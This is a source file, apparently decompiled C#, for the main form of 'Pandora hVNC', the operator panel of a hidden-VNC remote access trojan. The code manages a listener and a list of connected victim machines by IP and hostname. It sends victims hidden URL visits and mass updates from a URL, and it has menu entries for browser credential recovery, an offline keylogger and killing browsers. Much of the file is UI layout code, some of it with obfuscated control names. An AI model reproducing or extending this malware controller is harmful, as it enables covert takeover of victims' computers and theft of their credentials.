						string text = HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
							.Replace("}", null)
							.Replace(":", null)
							.Remove(0, 1);
						string text2 = HVNCList.FocusedItem.SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
							.Replace("}", null)
							.Replace(":", null)
							.Remove(0, 1);
						xxip = text;
						xxhostname = text2;
						obj.Text = text + ":" + text2;
						obj.Show();
						return;
					}
					Application.OpenForms[num].Show();
				}
				catch (Exception)
				{
					MessageBox.Show("You have to select a client first!", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			e.DrawDefault = true;
		}

		private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			if (e.Item.Selected)
			{
				e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point), checked(new Point(e.Bounds.Left + 3, e.Bounds.Top + 2)), Color.White);
			}
			else
			{
				e.DrawDefault = true;
			}
		}

		private void HVNCListenBtn_Click_1(object sender, EventArgs e)
		{
			if (Operators.CompareString(StatusPort.Text, "Enable Port", TextCompare: false) == 0)
			{
				StatusPort.Text = "Disable Port";
				HVNCListenBtn.Image = imageList2.Images[0];
				HVNCListenPort.Enabled = false;
				VNC_Thread = new Thread(Listenning)
				{
					IsBackground = true
				};
				bool_1 = true;
				VNC_Thread.SetApartmentState(ApartmentState.STA);
				VNC_Thread.Start();
				return;
			}
			IEnumerator enumerator = null;
			while (true)
			{
				try
				{
					try
					{
						enumerator = Application.OpenForms.GetEnumerator();
						while (enumerator.MoveNext())
						{
							Form form = (Form)enumerator.Current;
							if (form.Name.Contains("FrmVNC"))
							{
								form.Dispose();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception)
				{
					continue;
				}
				break;
			}
			HVNCListenPort.Enabled = true;
			VNC_Thread.Abort();
			bool_1 = false;
			StatusPort.Text = "Enable Port";
			HVNCListenBtn.Image = imageList2.Images[1];
			HVNCList.Items.Clear();
			_TcpListener.Stop();
			checked
			{
				int num = _clientList.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					_clientList[i].Close();
				}
				_clientList = new List<TcpClient>();
				int_2 = 0;
				ClientsOnline.Text = "Clients Online: 0";
			}
		}

		private void FrmMain_Load(object sender, EventArgs e)
		{
			HVNCList.Columns[1].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[2].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[3].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[4].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[5].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[6].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[7].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[8].TextAlign = HorizontalAlignment.Center;
			HVNCList.View = View.Details;
			HVNCList.HideSelection = false;
			HVNCList.OwnerDraw = true;
			HVNCList.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				Brush brush = new SolidBrush(Color.FromArgb(7, 11, 41));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.White);
			};
			HVNCList.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			HVNCList.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			ClientsOnline.Text = "Clients Online: 0";
		}

		private void guna2Button2_Click(object sender, EventArgs e)
		{

		}

		private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
		{

		}

		private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			HVNCListenBtn.PerformClick();
		}

		private void OpenBuilderBtn_Click(object sender, EventArgs e)
		{

		}

		private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
		{
			Environment.Exit(Environment.ExitCode);
		}

		private void StartPort_CheckedChanged_1(object sender, EventArgs e)
		{
			if (StartPort.Checked)
			{
				ListenPort.Enabled = false;
			}
			else if (!StartPort.Checked)
			{
				ListenPort.Enabled = true;
			}
		}

		private void visitURLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (HVNCList.SelectedItems.Count == 0)
				{
					MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				if (!ispressed)
				{
					return;
				}
				FrmVNC frmVNC = new FrmVNC();
				foreach (object selectedItem in HVNCList.SelectedItems)
				{
					_ = selectedItem;
					count = HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < count; i++)
				{
					frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
					object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
					frmVNC.hURL(saveurl);
					frmVNC.Dispose();
				}
				MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				ispressed = false;
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				Close();
			}
		}

		private void killChromeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void resetScaleToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
				frmVNC.ResetScale();
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void fromURLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (HVNCList.SelectedItems.Count == 0)
				{
					MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				if (!ispressed)
				{
					return;
				}
				FrmVNC frmVNC = new FrmVNC();
				foreach (object selectedItem in HVNCList.SelectedItems)
				{
					_ = selectedItem;
					count = HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < count; i++)
				{
					frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
					object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
					frmVNC.UpdateClient(MassURL);
					frmVNC.Dispose();
				}
				MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				ispressed = false;
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				Close();
			}
		}

		public void browserRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object tag = HVNCList.SelectedItems[i].Tag;
				string xip = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string xhostname = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				xxip = xip;
				xxhostname = xhostname;
				frmVNC.Tag = tag;
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void shutDownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void restartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void OfflineLogger_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object tag = HVNCList.SelectedItems[i].Tag;
				string xip = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string xhostname = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				xxip = xip;
				xxhostname = xhostname;
				frmVNC.Tag = tag;
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void killBraveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void killFirefoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void killEdgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void killBrowsersToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void killVivaldiToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void killToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		private void MassDisconnect_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + count, "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		private void killComodoToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmMain));
            Guna.UI2.AnimatorNS.Animation animation14 = new Guna.UI2.AnimatorNS.Animation();
            Guna.UI2.AnimatorNS.Animation animation13 = new Guna.UI2.AnimatorNS.Animation();
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem10 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem7 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem6 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem9 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem8 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
            this.BrowserRecovery = new System.Windows.Forms.ToolStripMenuItem();
            this.killBrowsersToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.Menu_Painel = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2CirclePictureBox4 = new Guna.UI2.WinForms.Guna2CirclePictureBox();
            this.Guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.Guna2CirclePictureBox2 = new Guna.UI2.WinForms.Guna2CirclePictureBox();
            this.Guna2HtmlLabel71 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2CirclePictureBox1 = new Guna.UI2.WinForms.Guna2CirclePictureBox();
            this.StatusPanel = new System.Windows.Forms.Panel();
            this.StatusPort = new System.Windows.Forms.Label();
            this.StartPort = new Guna.UI2.WinForms.Guna2ToggleSwitch();
            this.ListenPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.imageList2 = new System.Windows.Forms.ImageList(this.components);
            this.HVNCList = new System.Windows.Forms.ListView();
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader7 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader8 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader9 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.panel2 = new System.Windows.Forms.Panel();
            this.ClientsOnline = new System.Windows.Forms.Label();
            this.guna2ResizeBox2 = new Guna.UI2.WinForms.Guna2ResizeBox();
            this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
            this.HVNCListenBtn = new System.Windows.Forms.ToolStripMenuItem();
            this.portToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.HVNCListenPort = new System.Windows.Forms.ToolStripTextBox();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.Painel_Menu = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.Guna2HtmlLabel60 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox27 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2PictureBox21 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2GradientButton8 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.Guna2HtmlLabel85 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.Guna2GradientButton3 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.Guna2GradientButton7 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.Guna2GradientButton6 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.Guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.PortText = new System.Windows.Forms.Label();
            this.Painel_connection = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.Painel_Home = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.要那表外种先文非自会不达那种谢烟表这用这不意传文用词表劳这的伪许常表三 = new Guna.UI2.WinForms.Guna2Button();
            this.谢肉伙文伪说英文先自华传动价语中得外么么十天非字允天语英中不烟的问英道 = new Guna.UI2.WinForms.Guna2Button();
            this.式信仰仰非许会劳得谢这意文方份谢在间频伟问烟不那仰谢不份个问讲余道我中 = new Guna.UI2.WinForms.Guna2Button();
            this.Panel_ControlPage = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.guna2PictureBox31 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox30 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel48 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel47 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel45 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel44 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox26 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox25 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox24 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox23 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox22 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox19 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel43 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel42 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox20 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel41 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel40 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel39 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel38 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel37 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox17 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox16 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox15 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox14 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel46 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox80 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox18 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna_Chrome = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna_Edge = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna_Firefox = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna_Brave = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna_Opera = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Painel_Right = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.Guna2HtmlLabel53 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2Button5 = new Guna.UI2.WinForms.Guna2Button();
            this.Guna2PictureBox40 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2Button6 = new Guna.UI2.WinForms.Guna2Button();
            this.Guna2PictureBox70 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel13 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel14 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox6 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel15 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel16 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox29 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox7 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel17 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel18 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel19 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel20 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel21 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel22 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox8 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel23 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel24 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox9 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel25 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel26 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox10 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel27 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel28 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox11 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel29 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel30 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel31 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel32 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel33 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel34 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox12 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel35 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel36 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox13 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel1 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel2 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox2 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel3 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel4 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox3 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel5 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel6 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel7 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel8 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel9 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel10 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox4 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2HtmlLabel11 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel12 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2PictureBox5 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel87 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel59 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel86 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox35 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Android11_Red = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Android12_Red = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox41 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel83 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel72 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel66 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Android12_Green = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Android11_Green = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel81 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox36 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel73 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel67 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2PictureBox42 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Moldura = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Painel_Ports = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.Guna2GradientPanel12 = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.Guna2TextBox8 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2HtmlLabel84 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel82 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel80 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2GradientPanel13 = new Guna.UI2.WinForms.Guna2GradientPanel();
            this.Guna2HtmlLabel118 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
            this.Guna2TextBox7 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2HtmlLabel109 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.guna2HtmlLabel49 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel52 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel56 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2CheckBox15 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2HtmlLabel50 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel108 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel110 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2CheckBox14 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2TextBox3 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
            this.Guna2HtmlLabel111 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2CheckBox13 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2PictureBox62 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.Guna2HtmlLabel115 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
            this.Guna2CheckBox12 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2CheckBox2 = new Guna.UI2.WinForms.Guna2CheckBox();
            this.Guna2HtmlLabel78 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel114 = new Guna.UI2.WinForms.Guna2HtmlLabel();
            this.Guna2HtmlLabel119 = new Guna.UI2.WinForms.Guna2HtmlLabel();
